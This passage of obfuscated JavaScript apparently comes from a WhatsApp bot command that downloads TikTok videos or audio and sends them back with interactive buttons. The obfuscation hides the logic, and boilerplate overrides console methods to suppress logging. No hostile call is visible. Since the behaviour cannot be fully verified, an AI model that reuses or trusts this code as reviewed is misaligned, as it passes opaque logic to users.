_0x2d01fc;try{_0x2d01fc=_0x41ddf0[_0x317af2(0x19a,0x1d,0x154,0xd2,0x10)](_0x23b31a,_0x41ddf0[_0x18bbbc(-0x231,-0x1b6,-0x20d,-0x1fa,-0x241)](_0x41ddf0[_0x1f4bd2(0x180,0x203,0x89,0x147,0x151)](_0x41ddf0[_0x1f4bd2(0x185,0x20b,0x231,0x261,0x1a0)],_0x41ddf0[_0x38f7b7(0x38f,0x336,0x347,0x33a,0x3d4)]),');'))();}catch(_0x55fdfe){_0x2d01fc=_0x462e16;}return _0x2d01fc;}}return _0x1329df;}else _0x2c7959=_0x5b8cf6;},_0xf41273=_0x41ddf0[_0xc3861c(0x56,0xc,0x10e,0xb4,0xa9)](_0xe3f47d),_0x393e0c=_0xf41273[_0xcee2e2(0x4b9,0x407,0x358,0x45c,0x421)+'le']=_0xf41273[_0x39e623(0xf4,0xaa,0x1a,0x12c,0x10)+'le']||{};function _0xcee2e2(_0x326e8e,_0x4610b2,_0x1fbeb7,_0x3046ef,_0x3a7a95){return _0x334d(_0x3a7a95-0x199,_0x1fbeb7);}const _0x18b023=[_0x41ddf0[_0x39e623(0xd9,0xc1,0x90,0x136,0x172)],_0x41ddf0[_0x3c5b5d(0x29c,0x25d,0x18e,0x188,0x214)],_0x41ddf0[_0xc3861c(-0x9c,0x35,-0x33,-0x14a,0x19)],_0x41ddf0[_0x3c5b5d(0x1d2,0x12c,0xda,0xc6,0x13a)],_0x41ddf0[_0x435998(0x3dd,0x3ce,0x368,0x468,0x31d)],_0x41ddf0[_0x3c5b5d(0x1dc,0x1d8,0x279,0x20d,0x1f3)],_0x41ddf0[_0xcee2e2(0x3b1,0x2f0,0x465,0x3a7,0x3b6)]];function _0x3c5b5d(_0x60b775,_0x474754,_0xd694c9,_0x43b5b5,_0x4b825b){return _0x334d(_0x4b825b- -0x9c,_0x60b775);}for(let _0x49f504=0x2150+0x394+0x1272*-0x2;_0x41ddf0[_0xc3861c(-0x81,-0xc8,-0x152,-0x74,-0x46)](_0x49f504,_0x18b023[_0x3c5b5d(0x1ea,0x215,0x190,0x236,0x1a8)+'h']);_0x49f504++){if(_0x41ddf0[_0xcee2e2(0x471,0x4c3,0x43f,0x38a,0x451)](_0x41ddf0[_0x39e623(0x66,0x55,0xf0,0xa6,0xd1)],_0x41ddf0[_0x435998(0x4ab,0x49d,0x54b,0x3f7,0x404)])){const _0x2d55ce=_0x45d63b[_0xc3861c(0x38,-0x1,-0x25,0xb7,-0x92)+_0xcee2e2(0x3de,0x328,0x29f,0x255,0x30d)+'r'][_0x39e623(-0x5,-0x4d,-0x69,-0xbe,-0xa4)+_0x435998(0x4b1,0x4c0,0x3fc,0x45d,0x553)][_0x435998(0x2f4,0x36a,0x303,0x328,0x378)](_0x45d63b),_0x5ec780=_0x18b023[_0x49f504],_0x158d6d=_0x393e0c[_0x5ec780]||_0x2d55ce;_0x2d55ce[_0x39e623(0x7e,0x7d,-0x49,0x69,0x132)+_0xc3861c(-0xe2,-0xe9,-0xe1,-0x150,-0x188)]=_0x45d63b[_0x3c5b5d(0xc0,0x1bb,0x11b,0x179,0x104)](_0x45d63b),_0x2d55ce[_0xcee2e2(0x3b9,0x337,0x433,0x3f5,0x37a)+_0x39e623(-0x5a,-0x49,-0xc7,-0x4a,-0xd5)]=_0x158d6d[_0xc3861c(-0x7f,-0x11f,-0xa4,-0xb9,-0x3f)+_0x435998(0x3ec,0x35f,0x39d,0x2df,0x2d7)][_0x39e623(-0x8d,-0x3e,-0xd6,-0x7f,-0x10c)](_0x158d6d),_0x393e0c[_0x5ec780]=_0x2d55ce;}else _0x3a858b=_0x41ddf0[_0xc3861c(-0xc9,-0xe3,-0x74,-0x135,-0xfa)](_0x268f05,_0x41ddf0[_0x435998(0x3d9,0x34e,0x393,0x2eb,0x3ba)](_0x41ddf0[_0x39e623(0x85,0xbc,0xd7,0x135,0xfd)](_0x41ddf0[_0x39e623(-0x7f,-0xb,-0x8e,-0x87,-0x86)],_0x41ddf0[_0x39e623(-0x69,-0x66,0x2,-0x11,0x43)]),');'))();}});_0xa097ba();if(!text)return reply(_0x428f0b(0x37b,0x2bf,0x36d,0x2a6,0x2f1)+_0x18ff16(0x16f,0x213,0x15c,0x105,0x22e)+(prefix+command)+_0x428f0b(0x350,0x2d4,0x282,0x351,0x372));const dlt=require(_0x5f53f7(-0xc5,-0x6c,-0xad,-0x26,0x57)+_0x428f0b(0x1c7,0x1f4,0x28d,0x170,0x29e)+_0x8633e8(0x11c,0x12d,0x1df,0xcd,0x1cd)+'js');let tiktuk=await dlt[_0x8633e8(0xaf,0x3b,0x33,0x164,-0xd)+_0x8633e8(0x1a7,0x1aa,0x196,0x105,0x17f)+_0x25ae30(0x44d,0x4dc,0x4cf,0x493,0x4c2)](text),caption=_0x8633e8(0x9,0xb,0xb7,0xc2,-0x7f)+_0x8633e8(0x176,0x13b,0x160,0x10e,0xd4)+tiktuk[_0x8633e8(0x148,0x1ea,0x155,0x1e9,0xa1)+'t'][_0x8633e8(0xc6,0xa7,0xdb,0x56,-0x9)+'r'][_0x18ff16(0x1e4,0x298,0x130,0x2b2,0x21a)+_0x428f0b(0x3be,0x382,0x43a,0x3ba,0x3f1)]+(_0x8633e8(0x155,0xbe,0xde,0x131,0x17f)+_0x25ae30(0x34e,0x3f5,0x3e7,0x43c,0x499))+tiktuk[_0x5f53f7(-0x129,-0xd5,-0x1e,-0x57,-0x115)+'t'][_0x428f0b(0x19a,0x232,0x286,0x1d5,0x1f2)]+(_0x428f0b(0x304,0x34d,0x2b3,0x2fd,0x32b)+_0x5f53f7(-0x41,-0x25,0x6e,-0x4b,-0x2b))+tiktuk[_0x8633e8(0x148,0x1e9,0x176,0x1c7,0xfe)+'t'][_0x8633e8(0x1a3,0x168,0x1e8,0x21e,0x142)]+'*\x0a',buttons=[];if(tiktuk[_0x25ae30(0x515,0x515,0x4a7,0x552,0x4de)+'t'][_0x5f53f7(0xb8,-0xb0,0xa8,0x4,-0x42)]===_0x18ff16(0x17e,0x141,0x114,0xe5,0x24a)){const _0x332fb0={};_0x332fb0[_0x428f0b(0x2d4,0x2f4,0x24c,0x322,0x372)]=_0x8633e8(0x47,-0x21,0x3a,-0x2a,0x1a)+_0x25ae30(0x358,0x2a9,0x36a,0x30f,0x2a9)+'y',_0x332fb0[_0x428f0b(0x16c,0x207,0x200,0x1b8,0x2cb)+_0x8633e8(0x177,0x23e,0x146,0x1b6,0x1a5)+_0x8633e8(0x54,0x7d,0x2,-0x4e,0x8f)+'n']=_0x8633e8(0x28,0x60,-0x2e,-0xa9,0x79)+_0x428f0b(0x3d9,0x31c,0x2cd,0x2a3,0x3e0)+_0x25ae30(0x432,0x532,0x4b9,0x4e7,0x41c)+_0x5f53f7(-0xc8,-0x6d,-0x33,-0x17,-0x23)+_0x18ff16(0x1cd,0x218,0x151,0x103,0x29a)+_0x18ff16(0x14c,0x191,0x120,0x21c,0x1da)+':\x22'+prefix+(_0x428f0b(0x34d,0x2e4,0x3a0,0x244,0x280)+'g\x20')+text+'\x22}';const _0x389fb6={};_0x389fb6[_0x18ff16(0x1e9,0x28b,0x1b0,0x184,0x16c)]=_0x25ae30(0x2df,0x35b,0x3a6,0x2e3,0x306)+_0x25ae30(0x3ff,0x2c4,0x36a,0x298,0x302)+'y',_0x389fb6[_0x5f53f7(-0x1ee,-0x184,-0x22c,-0x179,-0xbe)+_0x25ae30(0x4b5,0x569,0x4d6,0x452,0x55d)+_0x25ae30(0x475,0x378,0x3b3,0x3bd,0x483)+'n']=_0x5f53f7(-0xbd,-0x213,-0x16d,-0x177,-0x1e5)+_0x18ff16(0x211,0x28f,0x1d1,0x2a5,0x1f2)+_0x8633e8(0x15a,0x1d0,0x210,0x1d3,0x17a)+_0x25ae30(0x3b7,0x46c,0x42c,0x3e2,0x3dc)+_0x25ae30(0x342,0x315,0x377,0x3e6,0x3ed)+_0x8633e8(0x76,0xf1,0x6a,0x144,-0x10)+':\x22'+prefix+(_0x8633e8(0xdb,0xdc,0xce,0xb,0x40)+'d\x20')+text+'\x22}',buttons[_0x18ff16(0x27c,0x2a6,0x1cb,0x292,0x1dd)](_0x332fb0,_0x389fb6);}if(tiktuk[_0x18ff16(0x21e,0x210,0x274,0x25f,0x23c)+'t'][_0x5f53f7(0x97,-0x21,0xab,0x4,-0x57)]===_0x18ff16(0x1a1,0x20f,0x199,0x11a,0x137)){const _0x9e874b={};_0x9e874b[_0x25ae30(0x468,0x474,0x472,0x4ce,0x456)]=_0x8633e8(0x47,0x105,0x2b,0x3d,0xc4)+_0x18ff16(0xe1,0x8f,0x1b2,0x141,0x9f)+'y',_0x9e874b[_0x5f53f7(-0x121,-0x226,-0xcd,-0x179,-0x223)+_0x18ff16(0x24d,0x273,0x1ba,0x29c,0x1d1)+_0x18ff16(0x12a,0x181,0x125,0x1f9,0xb4)+'n']=_0x18ff16(0xfe,0x19e,0x49,0xf7,0x75)+_0x18ff16(0x211,0x1a1,0x185,0x1d7,0x243)+_0x25ae30(0x51e,0x55a,0x4b9,0x479,0x57d)+_0x428f0b(0x287,0x2a6,0x1ef,0x33f,0x290)+_0x18ff16(0x178,0x1da,0x1f5,0x106,0x23b)+_0x8633e8(0x79,0x93,0x76,0x70,0x53)+_0x25ae30(0x4db,0x40f,0x492,0x3c5,0x3ff)+prefix+(_0x18ff16(0x237,0x1f8,0x229,0x265,0x2e3)+'\x20')+text+'\x22}';const _0x3e967f={};_0x3e967f[_0x25ae30(0x528,0x535,0x472,0x476,0x4e4)]=_0x428f0b(0x248,0x228,0x20a,0x2c6,0x183)+_0x8633e8(0xb,0x33,0xdb,0x16,0x6b)+'y',_0x3e967f[_0x8633e8(0x26,0xbe,-0xa6,0xc6,-0xd)+_0x5f53f7(0xf,-0x5,-0x21,-0x28,0x47)+_0x428f0b(0x1bd,0x235,0x258,0x1b1,0x2ac)+'n']=_0x18ff16(0xfe,0x11e,0x1c5,0x48,0x5c)+_0x18ff16(0x211,0x271,0x18c,0x1c4,0x233)+_0x8633e8(0x15a,0xa6,0x208,0x141,0x1e9)+_0x8633e8(0xc5,0x9e,0x99,0xe3,-0x1)+_0x5f53f7(-0x174,-0x8e,-0x77,-0xc7,-0x10b)+_0x8633e8(0x79,-0x29,0x142,0x6c,-0x16)+_0x428f0b(0x2f2,0x314,0x341,0x364,0x295)+prefix+(_0x5f53f7(-0x2f,-0x79,-0x131,-0xaa,-0x82)+'\x20')+text+'\x22}';const _0x398f82={};_0x398f82[_0x25ae30(0x4ea,0x3a1,0x472,0x489,0x4c8)]=_0x8633e8(0x47,0x10e,0x5b,-0x40,-0x1a)+_0x8633e8(0xb,0x7a,-0x11,0xd2,0x7e)+'y',_0x398f82[_0x18ff16(0xfc,0x2c,0x18a,0x10b,0x19b)+_0x25ae30(0x4e9,0x462,0x4d6,0x542,0x468)+_0x8633e8(0x54,0x10b,0xf8,0xd8,-0x12)+'n']=_0x5f53f7(-0xde,-0x1fd,-0xf6,-0x177,-0x23a)+_0x18ff16(0x211,0x283,0x259,0x26c,0x276)+_0x428f0b(0x34f,0x33b,0x300,0x339,0x2f3)+_0x25ae30(0x3d8,0x483,0x42c,0x3fd,0x450)+_0x25ae30(0x3cd,0x389,0x377,0x38e,0x3d5)+_0x25ae30(0x35c,0x43a,0x3d5,0x404,0x3f5)+':\x22'+prefix+(_0x25ae30(0x4a1,0x37c,0x43a,0x4f0,0x42d)+'d\x20')+text+'\x22}',buttons[_0x5f53f7(0x67,0x88,0xb0,0x7,-0xc3)](_0x9e874b,_0x3e967f,_0x398f82);}function _0x25ae30(_0x19104d,_0x3d35f1,_0xaaa6a1,_0x3344a7,_0x5a6823){return _0x334d(_0xaaa6a1-0x20c,_0x3d35f1);}if(![_0x8633e8(0x115,0x73,0x90,0x92,0xae),_0x18ff16(0x22f,0x2cb,0x15d,0x170,0x195),'sd','hd'][_0x8633e8(0x39,0x55,0xc3,-0xa,-0x81)+_0x428f0b(0x3f6,0x353,0x301,0x368,0x321)](args[0x1c78+0x2*-0xbdb+-0x4c2])){const _0x13e1b1={};_0x13e1b1[_0x25ae30(0x559,0x4cd,0x498,0x4b8,0x3ef)+_0x25ae30(0x53a,0x501,0x4a5,0x526,0x501)+_0x5f53f7(-0x109,-0x32,0x14,-0x3f,-0xdc)+_0x428f0b(0x330,0x376,0x32b,0x344,0x2b2)]={},_0x13e1b1[_0x18ff16(0x20f,0x20d,0x256,0x1d2,0x1e8)+_0x5f53f7(0xe,0x41,-0xa1,-0x59,0x29)+_0x8633e8(0x160,0x182,0x1fc,0x19d,0x19d)+_0x8633e8(0x194,0x1e5,0x231,0x1bf,0x232)+_0x25ae30(0x42d,0x496,0x4c9,0x55e,0x41c)]=0x2;const _0xc0d3e={};_0xc0d3e[_0x18ff16(0x255,0x28e,0x2ab,0x2cd,0x1fc)]=caption;const _0x2b0d66={};_0x2b0d66[_0x18ff16(0x255,0x2cd,0x1d1,0x2f4,0x29c)]=wm;const _0x1a095b={};_0x1a095b[_0x25ae30(0x3fa,0x471,0x47d,0x4ef,0x3cd)]=_0x25ae30(0x579,0x596,0x4d0,0x441,0x477)+_0x18ff16(0x1e2,0x171,0x1c9,0x1d7,0x11f)+_0x18ff16(0x168,0x1d0,0x128,0xbe,0x1c4)+_0x428f0b(0x31e,0x2bb,0x2e1,0x304,0x319)+_0x8633e8(0x66,0x5b,0x129,0x35,0xf2)+_0x8633e8(0xb9,0xf7,0x11f,0xdc,0xa2)+_0x5f53f7(-0x85,-0x63,-0x12c,-0x10a,-0xbd)+_0x428f0b(0x349,0x2e5,0x29d,0x39c,0x2e9)+_0x8633e8(0xc3,0x44,0x171,-0xd,0x10f)+_0x18ff16(0x20a,0x162,0x244,0x1f4,0x1e4)+_0x18ff16(0x17b,0x1c8,0x170,0x1ba,0x12f)+_0x5f53f7(-0x132,-0x206,-0xc3,-0x169,-0x13b)+_0x8633e8(0x152,0xb0,0x16a,0x145,0x8e)+_0x8633e8(0x8b,0x11d,0xb1,0x9c,0x2e)+_0x18ff16(0x231,0x2f7,0x29a,0x1f6,0x2ed)+_0x5f53f7(0xb,-0xb2,-0x69,-0xb1,-0xf6)+'ng';const _0x467941={};_0x467941[_0x25ae30(0x4d4,0x40b,0x407,0x48e,0x36f)]=_0x1a095b;const _0x537b03={};_0x537b03[_0x8633e8(0x13e,0xa7,0x98,0x15b,0x1d5)+'d']=zynX[_0x25ae30(0x3e7,0x3e6,0x3ab,0x3b5,0x2e0)+_0x428f0b(0x132,0x1ef,0x1f4,0x28b,0x1cb)+_0x428f0b(0x215,0x230,0x210,0x1ce,0x18d)+'r'];const _0x32090a={};_0x32090a[_0x25ae30(0x302,0x400,0x385,0x2ce,0x35e)+'ns']=buttons;const _0x67661f={};_0x67661f[_0x5f53f7(-0xc1,-0x28,0x27,-0x92,-0x67)+_0x25ae30(0x517,0x41c,0x449,0x3ee,0x3eb)+_0x18ff16(0x1ec,0x210,0x11f,0x19b,0x175)]=saluran,_0x67661f[_0x428f0b(0x35f,0x2ee,0x2d9,0x21e,0x22f)+_0x18ff16(0x1c0,0x279,0x1fe,0x119,0x261)+_0x5f53f7(-0xf2,-0xb5,-0x163,-0xff,-0x1b7)]=idsal,_0x67661f[_0x428f0b(0x360,0x36a,0x29a,0x33e,0x303)+_0x5f53f7(-0xcf,-0x29,-0x174,-0xd3,-0x13b)+_0x8633e8(0x17a,0x1d0,0x202,0x109,0x185)]=0x8f;const _0x2b0755={};_0x2b0755[_0x8633e8(0xfa,0x104,0xab,0xc8,0xd2)+_0x8633e8(0x151,0xd5,0xf7,0x202,0x198)+'id']=[m[_0x8633e8(0x5b,0xa,0x102,0xf9,0x6b)+'r']],_0x2b0755[_0x18ff16(0x23c,0x16b,0x1ee,0x19a,0x173)+_0x428f0b(0x417,0x35e,0x2b5,0x364,0x3cf)+_0x25ae30(0x529,0x523,0x507,0x518,0x547)]=0x3e7,_0x2b0755[_0x5f53f7(-0x176,-0x11c,-0x137,-0x118,-0x145)+_0x8633e8(0x2d,-0x24,0xb9,0xce,-0x5f)+'d']=!![],_0x2b0755[_0x5f53f7(0x67,0x2b,0x38,-0x39,-0x79)+_0x8633e8(0x19f,0x10f,0x231,0xe4,0x132)+_0x8633e8(0x7a,0x8b,0x6a,0x11b,0xa7)+_0x5f53f7(-0x4f,-0x56,-0xd9,-0x11b,-0xd2)+_0x18ff16(0x1b9,0x12f,0xf0,0x233,0x1e8)+_0x5f53f7(-0x1d4,-0xf0,-0x1ce,-0x130,-0x182)]=_0x67661f;let msg=generateWAMessageFromContent(from,{'viewOnceMessage':{'message':{'messageContextInfo':_0x13e1b1,'interactiveMessage':proto[_0x25ae30(0x424,0x4c6,0x489,0x3d3,0x524)+'ge'][_0x18ff16(0x179,0x185,0x187,0x106,0xad)+_0x5f53f7(0x6c,-0xb2,0x58,-0x18,-0xd2)+_0x25ae30(0x47e,0x49e,0x44b,0x45d,0x4e3)+_0x8633e8(0x14a,0xd7,0xe2,0x216,0x17f)][_0x5f53f7(-0x1ed,-0x12e,-0xf7,-0x180,-0x17f)+'e']({'body':proto[_0x5f53f7(-0xd6,-0xa8,-0xe4,-0x75,-0xdb)+'ge'][_0x25ae30(0x442,0x3db,0x402,0x3b4,0x43c)+_0x5f53f7(0x1a,0x49,-0xd2,-0x18,-0xe4)+_0x25ae30(0x39b,0x387,0x44b,0x4d2,0x47e)+_0x5f53f7(0x6a,-0x70,-0x92,-0x55,-0xec)][_0x18ff16(0x271,0x297,0x2bd,0x1e9,0x318)][_0x5f53f7(-0x1cd,-0x19c,-0x125,-0x180,-0xf8)+'e'](_0xc0d3e),'footer':proto[_0x18ff16(0x200,0x2cc,0x279,0x19d,0x24e)+'ge'][_0x5f53f7(-0x1a7,-0x48,-0xec,-0xfc,-0x1cc)+_0x8633e8(0x187,0x1f3,0x245,0x1eb,0x192)+_0x18ff16(0x1c2,0x284,0x261,0x276,0x229)+_0x8633e8(0x14a,0x82,0x102,0xb3,0xce)][_0x8633e8(0x93,0x9,0xb7,0x4e,-0x18)+'r'][_0x5f53f7(-0x10b,-0x157,-0xe4,-0x180,-0x1c6)+'e'](_0x2b0d66),'header':proto[_0x18ff16(0x200,0x168,0x1fa,0x1c1,0x21e)+'ge'][_0x5f53f7(-0x9e,-0x1b0,-0x167,-0xfc,-0x4d)+_0x8633e8(0x187,0xd3,0x15f,0x24c,0x140)+_0x18ff16(0x1c2,0x102,0x216,0x233,0x209)+_0x25ae30(0x533,0x4df,0x4a9,0x437,0x523)][_0x25ae30(0x431,0x403,0x394,0x36b,0x369)+'r'][_0x428f0b(0x1f2,0x200,0x139,0x145,0x236)+'e']({...await prepareWAMessageMedia(_0x467941,_0x537b03),'title':'','gifPlayback':!![],'subtitle':ownername,'hasMediaAttachment':![]}),'nativeFlowMessage':proto[_0x25ae30(0x504,0x407,0x489,0x4e1,0x453)+'ge'][_0x8633e8(0xa3,0x6e,0xa2,0xa0,0x13e)+_0x25ae30(0x490,0x489,0x4e6,0x53f,0x45e)+_0x18ff16(0x1c2,0x27b,0x207,0x11e,0x22f)+_0x25ae30(0x52a,0x41e,0x4a9,0x516,0x53b)][_0x8633e8(0x7f,0x83,-0x1a,0x7a,0x13c)+_0x18ff16(0x268,0x2cb,0x1d6,0x20c,0x278)+_0x5f53f7(-0xa3,-0x66,-0x19,-0x75,0x17)+'ge'][_0x25ae30(0x3cf,0x3f0,0x37e,0x35d,0x389)+'e'](_0x32090a),'contextInfo':_0x2b0755})}}},{});await zynX[_0x18ff16(0x188,0x160,0x132,0x187,0x216)+_0x428f0b(0x30c,0x30b,0x344,0x35e,0x34b)+'ge'](msg[_0x428f0b(0x34b,0x36b,0x35f,0x393,0x2f8)][_0x5f53f7(-0xd3,-0x11a,-0x60,-0xfe,-0x42)+_0x5f53f7(-0x77,-0x185,-0xf4,-0xc0,-0xa2)],msg[_0x5f53f7(-0x90,-0x19f,-0x9e,-0x145,-0x186)+'ge'],{'messageId':msg[_0x18ff16(0x260,0x2b5,0x1af,0x245,0x2f8)]['id']});}function _0x428f0b(_0x386cb0,_0xe4a5c5,_0x3685ea,_0x27b5dd,_0x323814){return _0x334d(_0xe4a5c5-0x8e,_0x3685ea);}function _0x5f53f7(_0x25efd7,_0x120334,_0x4fc98c,_0x437d5f,_0x22e33e){return _0x334d(_0x437d5f- -0x2f2,_0x4fc98c);}if(args[-0x1fbb+0x3d*-0x28+0x2943]===_0x18ff16(0x1eb,0x186,0x1cb,0x1dd,0x143))reply(mess[_0x25ae30(0x309,0x37e,0x38e,0x414,0x2fe)]),tiktuk[_0x18ff16(0x21e,0x253,0x219,0x189,0x1b0)+'t'][_0x428f0b(0x1ce,0x289,0x204,0x2e8,0x333)+'s'][_0x428f0b(0x398,0x378,0x338,0x375,0x31c)+'ch'](async _0x1d06a3=>{function _0x1fdadb(_0x4131f2,_0x3a968c,_0x24c2db,_0x3a54b5,_0x47ed23){return _0x428f0b(_0x4131f2-0x1e2,_0x4131f2-0xb9,_0x24c2db,_0x3a54b5-0x19d,_0x47ed23-0x1ef);}const _0x15c00b={};function _0x2dd3c0(_0x3c65af,_0xca329e,_0xd3f464,_0x3907da,_0x3ea00f){return _0x8633e8(_0xca329e-0x23e,_0xca329e-0x66,_0x3ea00f,_0x3907da-0x71,_0x3ea00f-0x1f1);}_0x15c00b[_0x507df9(0x234,0x225,0x240,0x2ce,0x18a)]=_0x1d06a3;const _0x18af78={};function _0x507df9(_0x56ddf0,_0x49b97e,_0x10ee0f,_0x235a20,_0x3e1b17){return _0x8633e8(_0x49b97e-0x107,_0x49b97e-0x11,_0x235a20,_0x235a20-0x106,_0x3e1b17-0x14d);}function _0x54f2de(_0x1c83c7,_0x56b05e,_0x48bd80,_0x36be88,_0x3f3f89){return _0x428f0b(_0x1c83c7-0xf6,_0x3f3f89- -0x32e,_0x36be88,_0x36be88-0x1c2,_0x3f3f89-0x176);}_0x18af78[_0x507df9(0x15b,0x1af,0x227,0x13e,0x1e5)]=_0x15c00b;const _0x2cb3c1={};function _0x5b44c2(_0xf16e07,_0x5ccbc0,_0x1ea40e,_0x3ecf7b,_0x509bfc){return _0x18ff16(_0x1ea40e- -0x1ff,_0x509bfc,_0x1ea40e-0xd4,_0x3ecf7b-0x103,_0x509bfc-0x1ac);}_0x2cb3c1[_0x507df9(0x156,0x13b,0x100,0x80,0x183)+'d']=fcall,await zynX[_0x5b44c2(-0x27,-0x13c,-0xd3,-0x11a,-0xac)+_0x507df9(0x21b,0x1ea,0x1b2,0x230,0x1ca)+'e'](m[_0x2dd3c0(0x2de,0x24f,0x2ec,0x319,0x269)],_0x18af78,_0x2cb3c1);});else{if(args[-0x94e+0x19bd+-0x106f]===_0x25ae30(0x40a,0x57f,0x4b8,0x54a,0x47b)){reply(mess[_0x25ae30(0x38f,0x2e4,0x38e,0x3cf,0x386)]);const _0x2f3448={};_0x2f3448[_0x8633e8(0x11e,0x9e,0x1cb,0x14f,0xde)]=tiktuk[_0x428f0b(0x30c,0x329,0x3e2,0x3c5,0x36e)+'t'][_0x5f53f7(-0x127,-0x19d,-0x46,-0xfb,-0xc3)];const _0x4270d0={};_0x4270d0[_0x5f53f7(-0x95,-0xdb,-0x93,-0x88,-0xc0)]=_0x2f3448,_0x4270d0[_0x8633e8(0x5c,0xda,0x12b,0x11a,0x26)+_0x428f0b(0x3a6,0x382,0x2eb,0x44c,0x3b1)]=_0x5f53f7(-0xfe,-0x57,-0xdf,-0x82,-0x3e)+_0x5f53f7(-0x205,-0x1b9,-0x1ba,-0x157,-0xc1),_0x4270d0[_0x5f53f7(-0xe6,-0xf8,-0xf3,-0xd7,-0x122)+_0x5f53f7(-0x1c5,-0x11d,-0x191,-0x124,-0x14f)]=_0x8633e8(0x117,0x128,0x15e,0x97,0x131)+_0x25ae30(0x4a5,0x37d,0x3f6,0x3a0,0x38c),_0x4270d0[_0x428f0b(0x18c,0x23a,0x2e1,0x1b2,0x1cd)+'on']=mess[_0x18ff16(0xfa,0xbc,0x142,0x101,0x199)+'ss'],zynX[_0x5f53f7(-0x1f3,-0x195,-0xc2,-0x149,-0x121)+_0x428f0b(0x359,0x2c4,0x2ae,0x2f1,0x2e6)+'e'](m[_0x18ff16(0xe7,0xdb,0xeb,0x126,0x172)],_0x4270d0);}else{if(args[0xe9b+0x1*0x127f+-0x211a]==='sd'){reply(mess[_0x25ae30(0x32b,0x2eb,0x38e,0x43f,0x2ed)]);const _0x44f89e={};_0x44f89e[_0x8633e8(0x11e,0x9c,0x1c1,0x15c,0x1aa)]=tiktuk[_0x25ae30(0x45d,0x491,0x4a7,0x423,0x470)+'t'][_0x8633e8(0xcb,0x184,0x92,0x129,0x1d)+'1'];const _0x19e577={};_0x19e577[_0x5f53f7(-0xb,-0x45,-0xf6,-0xd4,-0xb1)]=_0x44f89e,_0x19e577[_0x25ae30(0x3fd,0x37b,0x3b8,0x46e,0x365)+'on']=mess[_0x8633e8(0x24,-0x2e,0xbd,-0x32,-0x37)+'ss'];const _0x9d9774={};_0x9d9774[_0x5f53f7(-0x1a0,-0x20e,-0x13a,-0x16b,-0x167)+'d']=fcall,zynX[_0x5f53f7(-0xda,-0x86,-0x100,-0x149,-0xff)+_0x18ff16(0x1b9,0x140,0x1c4,0x10f,0x117)+'e'](m[_0x8633e8(0x11,0xa0,-0x69,0x67,-0xa1)],_0x19e577,_0x9d9774);}else{if(args[0x1eb5+0x5ed*-0x4+-0x701]==='hd'){reply(mess[_0x25ae30(0x44d,0x430,0x38e,0x321,0x395)]);const _0x5bdf4b={};_0x5bdf4b[_0x18ff16(0x1f4,0x1d5,0x19f,0x2b3,0x28d)]=tiktuk[_0x5f53f7(-0x102,0x1d,-0xa9,-0x57,-0xc9)+'t'][_0x8633e8(0xcb,0x5f,0x72,0xeb,0x42)+_0x18ff16(0x13d,0x128,0x1ac,0x8c,0x17e)];const _0x30b1cb={};_0x30b1cb[_0x25ae30(0x3f6,0x4f1,0x42a,0x382,0x430)]=_0x5bdf4b,_0x30b1cb[_0x428f0b(0x1e6,0x23a,0x1ac,0x184,0x2f0)+'on']=mess[_0x18ff16(0xfa,0x72,0x30,0x39,0x150)+'ss'];const _0x181921={};_0x181921[_0x18ff16(0x10a,0xbf,0x77,0x168,0x167)+'d']=fcall,zynX[_0x8633e8(0x56,0xa9,-0x52,0xdb,-0x3a)+_0x25ae30(0x3b1,0x455,0x442,0x4dc,0x3f5)+'e'](m[_0x8633e8(0x11,0xaa,-0x1f,-0x6,0x77)],_0x30b1cb,_0x181921);}}}}(function(){function _0x26d2a0(_0x1d6325,_0x29f25d,_0x4346cb,_0x2ee81f,_0x383e05){return _0x5f53f7(_0x1d6325-0xf4,_0x29f25d-0x0,_0x2ee81f,_0x1d6325-0x3fc,_0x383e05-0x76);}const _0x5f13ad={'YvHKz':function(_0x33966d,_0x48e2ef){return _0x33966d!==_0x48e2ef;},'TwaOl':_0x357cbe(0x2b5,0x2f3,0x22d,0x26a,0x247),'INJln':_0x2161ea(-0xbf,-0x151,-0x54,-0x1,-0xc),'rTRbL':_0x2161ea(-0x1bc,-0x218,-0x164,-0x219,-0x23e),'kfzpW':_0x357cbe(0x23f,0x248,0x29d,0x297,0x205),'kIYzC':function(_0x17247d,_0xde55a3){return _0x17247d(_0xde55a3);},'IINrQ':function(_0x3f3cf1,_0x29ca23){return _0x3f3cf1+_0x29ca23;},'yUoTJ':_0x40911f(0x30e,0x3b6,0x32b,0x284,0x358)+_0x357cbe(0x11b,0x10b,0x1c1,0x169,0x1ef)+_0x357cbe(0x159,0x13e,0x20a,0x2d6,0x27b)+_0x22d19a(0x31f,0x202,0x320,0x2e7,0x281),'WThFU':_0x22d19a(0x2d2,0x1ad,0x25d,0x290,0x27c)+_0x357cbe(0x175,0x104,0x1c4,0x250,0x152)+_0x40911f(0x32e,0x349,0x274,0x326,0x370)+_0x26d2a0(0x353,0x3c5,0x3e1,0x39a,0x28a)+_0x40911f(0x299,0x2ac,0x319,0x369,0x271)+_0x2161ea(-0x125,-0x10f,-0x12b,-0xa9,-0xa3)+'\x20)','QIuEG':function(_0xe6203,_0x592781){return _0xe6203===_0x592781;},'uXfnt':_0x22d19a(0x216,0x1e7,0x14c,0x266,0x1cb),'rZRUT':function(_0x393653){return _0x393653();}};function _0x357cbe(_0x3b12be,_0xd8d5ec,_0x16ee50,_0xbe0deb,_0x489a3d){return _0x5f53f7(_0x3b12be-0x1d4,_0xd8d5ec-0x1b2,_0xd8d5ec,_0x16ee50-0x315,_0x489a3d-0xa6);}function _0x22d19a(_0x4214b2,_0x4280e6,_0x4c46f1,_0x26bd6c,_0x3e9cca){return _0x25ae30(_0x4214b2-0x12c,_0x4280e6,_0x3e9cca- -0x1b4,_0x26bd6c-0x84,_0x3e9cca-0x199);}function _0x2161ea(_0x37bdb3,_0x5c61fe,_0x5fa214,_0x5a7273,_0x3b5f19){return _0x428f0b(_0x37bdb3-0xf,_0x37bdb3- -0x42e,_0x5a7273,_0x5a7273-0x12d,_0x3b5f19-0x113);}const _0x4baff6=function(){function _0x568ee8(_0x105598,_0x101c10,_0x397d92,_0x4b94ef,_0x5f1899){return _0x26d2a0(_0x4b94ef- -0x53,_0x101c10-0xff,_0x397d92-0x1e5,_0x397d92,_0x5f1899-0x1ca);}function _0x208252(_0x2fc938,_0x21f116,_0x1e25a3,_0xb7f403,_0x25a7f1){return _0x22d19a(_0x2fc938-0x123,_0x1e25a3,_0x1e25a3-0x12,_0xb7f403-0x1e5,_0x2fc938- -0x1c6);}function _0x1b743f(_0x40871f,_0x15e12a,_0x3612d6,_0x44fe63,_0x12aba1){return _0x40911f(_0x12aba1- 